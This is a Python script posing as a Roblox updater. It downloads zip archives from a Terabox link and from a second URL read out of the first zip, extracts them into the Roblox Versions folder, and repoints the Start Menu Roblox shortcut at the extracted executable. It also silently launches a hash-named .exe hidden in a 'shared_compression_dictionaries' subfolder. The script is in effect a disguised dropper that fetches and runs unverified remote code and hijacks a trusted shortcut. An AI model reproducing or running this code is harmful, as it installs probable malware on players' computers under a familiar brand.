import os
import zipfile
import subprocess
import requests
from pathlib import Path

VERSION_URL = "https://raw.githubusercontent.com/NBTHUB594/re-version/refs/heads/main/version.txt"
ZIP_URL = "https://kul-ddata.terabox.com/file/c683aa5b663540dd80523cc117872a43?bkt=en-cf7b18a7c51d90781dcb5dc9bc8d5dcd0a89917a99f89fe9f6787eb8333e506d2e1bd191afe702f6&xcode=6bdf4b809addd120e85af9b113cbcbf5c1e264946dc91ed87eaad5ce2b5c838309d23bbaa5c378732a8a1a91628fde1cac3565d15c7ed4f1&fid=81365932883188-250528-121341098250489&time=1740131594&sign=FDTAXUGERLQlBHSKfWaon-DCb740ccc5511e5e8fedcff06b081203-ST5sRugJrsPx%2FHTDWpGeONXM0rU%3D&to=153&size=183711792&sta_dx=183711792&sta_cs=0&sta_ft=zip&sta_ct=0&sta_mt=0&fm2=MH%2Ckul%2CAnywhere%2C%2CTm9udGhhYnVyaQ%3D%3D%2Cany&region=kul&ctime=1740131242&mtime=1740131242&resv0=-1&resv1=0&resv2=rlim&resv3=5&resv4=183711792&vuk=81365932883188&iv=0&htype=&randtype=&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-25f18373120ea7d78e21edc8f402f1724fe5e12ca383d5914b144f323cbe342e54819ecc0c20f995&sl=68091977&expires=1740160394&rt=pr&r=901580769&vbdid=-&fin=version-2d6639b3364b47cd.zip&fn=version-2d6639b3364b47cd.zip&rtype=1&dp-logid=47198182975384311&dp-callid=0.1&hps=1&tsl=2000&csl=2000&fsl=-1&csign=mxK3ojMyrnjwAvPgIUoNG3qqlco%3D&so=0&ut=6&uter=4&serv=0&uc=1718005224&ti=9c74a385a1d3afc5f4d6c870a21f25952e89250ffcc6feab305a5e1275657320&tuse=&raw_appid=0&ogr=0&rregion=VF9V&adg=&reqlabel=250528_f_34510aeef8a4001e10b35ddc8a25d796_-1_94e54a11c95cc300245dc8742bff7c04&ccn=TH&by=themis"

try:
    response = requests.get(VERSION_URL)
    response.raise_for_status()
    latest_version = response.text.strip()
except Exception as e:
    print(f"Error fetching version info: {e}")
    latest_version = None

version = "version-2d6639b3364b47cd"
localappdata = Path(os.getenv("LOCALAPPDATA"))
roblox_versions = localappdata / "Roblox" / "Versions"
extract_path = roblox_versions / version
zip_file = Path(f"{version}.zip")

download_url = None

if latest_version and latest_version != version:
    print(f"New version available: {latest_version}. Downloading...")
    try:
        zip_response = requests.get(ZIP_URL, stream=True)
        zip_response.raise_for_status()
        with open(zip_file, "wb") as file:
            for chunk in zip_response.iter_content(chunk_size=8192):
                file.write(chunk)
        print("Download complete.")
        version = latest_version
        extract_path = roblox_versions / version
    except Exception as e:
        print(f"Error downloading update: {e}")

if zip_file.exists():
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        zip_ref.extractall(extract_path)
        link_file = extract_path / "download_link.txt"
        if link_file.exists():
            with open(link_file, "r") as f:
                download_url = f.read().strip()
            print(f"Download URL from zip: {download_url}")
        else:
            print(f"No download link file found in the zip.")
else:
    print(f"ZIP file {zip_file} not found.")

if download_url:
    try:
        download_response = requests.get(download_url, stream=True)
        download_response.raise_for_status()
        downloaded_zip = Path("downloaded_version.zip")
        with open(downloaded_zip, "wb") as file:
            for chunk in download_response.iter_content(chunk_size=8192):
                file.write(chunk)
        print("New version download complete.")

        with zipfile.ZipFile(downloaded_zip, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
    except Exception as e:
        print(f"Error downloading the new version from link: {e}")

start_menu = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Roblox"
shortcut_path = start_menu / "Roblox Player.lnk"
new_target = str(extract_path / "RobloxPlayerBeta.exe")

if shortcut_path.exists():
    import winshell
    with winshell.shortcut(str(shortcut_path)) as shortcut:
        shortcut.path = new_target
        shortcut.write()
    print(f"Updated shortcut target to {new_target}")
else:
    print(f"Shortcut {shortcut_path} not found.")

exe1_path = extract_path / "PlatformContent" / "pc" / "shared_compression_dictionaries" / "62984ae65da3aa6fcebddeecb409e6db8096ec70c0b42f688a8950b54c9d3483.exe"
if exe1_path.exists():
    subprocess.Popen([str(exe1_path)], shell=True)

exe2_path = extract_path / "RobloxPlayerBeta.exe"
if exe2_path.exists():
    subprocess.Popen([str(exe2_path)], shell=True)
    print(f"Running {exe2_path}")
else:
    print(f"Executable {exe2_path} not found.")
